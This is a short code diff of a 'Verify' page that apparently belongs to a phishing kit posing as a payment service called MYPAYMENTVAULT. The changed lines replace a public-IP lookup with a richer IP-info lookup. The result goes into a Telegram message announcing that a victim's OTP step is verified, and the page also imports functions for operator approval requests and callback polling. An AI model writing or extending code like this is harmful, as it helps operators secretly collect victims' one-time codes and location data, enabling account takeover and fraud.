@@ -4,7 +4,7 @@ import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { sendTelegram, getPublicIP, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
+import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -119,7 +119,7 @@ export default function Verify() {
     }
 
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip  = await getPublicIP();
+    const ip  = await getIPInfo();
 
     await sendTelegram(
       `✅ <b>MYPAYMENTVAULT - Step 2: OTP Verified</b>\n\n` +
